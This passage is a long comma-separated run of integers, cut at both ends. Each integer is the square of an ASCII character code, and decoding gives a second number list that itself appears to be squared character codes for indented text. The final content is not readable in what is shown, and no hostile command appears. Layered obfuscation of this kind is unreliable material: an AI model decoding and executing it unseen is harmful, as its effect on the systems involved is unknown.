,2809,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2916,3136,3136,3249,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2704,2601,2809,2916,1936,2601,2401,2601,2916,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2916,2304,3136,2704,1936,2401,2916,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2916,3136,3136,3249,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2704,2601,2809,2916,1936,2601,2401,2601,2916,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,3136,2401,2304,2304,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2401,2809,2916,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,3249,2304,2500,2809,1936,3025,3025,2704,2704,1936,2401,2401,2809,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2500,3136,2304,3249,1936,3249,2916,2304,2704,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2304,2704,2401,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2601,2500,2704,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2500,3249,3249,2916,1936,2916,3136,3136,3249,1936,2401,2401,2704,2704,3249,1936,3249,2304,2500,2809,1936,2401,2304,3136,2401,2916,1936,2401,2401,2704,2704,3249,1936,2401,2500,3249,3249,2916,1936,3249,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2916,2704,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2916,2304,3249,1936,3025,2500,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2601,2500,2704,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2500,3249,3249,2916,1936,2916,3136,3136,3249,1936,2401,2401,2704,2704,3249,1936,3249,2304,2500,2809,1936,2401,2304,3136,2401,2916,1936,2401,2401,2704,2704,3249,1936,2401,2500,3249,3249,2916,1936,3249,2304,2500,2809,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2916,2704,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2601,2500,2704,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2304,2500,2704,1936,2401,2601,2916,3249,1936,3025,3025,2704,2704,1936,2401,2304,2500,2704,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2304,2304,2304,2304,1936,3025,2809,2916,3249,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2304,2500,2704,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2304,3136,3249,1936,2401,2304,2500,2704,1936,2500,2916,2304,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2704,2401,2916,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,3025,2809,2916,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2500,2401,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2916,2704,3249,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2809,3025,3025,2916,1936,2500,2601,2304,2704,1936,2601,2500,2704,3249,1936,2809,2304,2704,2401,1936,2809,2401,3136,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2401,3136,2704,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2704,2916,2704,2401,1936,2916,3025,2500,2704,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2500,2601,2304,2704,1936,2809,2304,2704,2401,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2916,2304,3249,1936,3025,2500,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2500,3249,2401,2916,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2916,2809,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304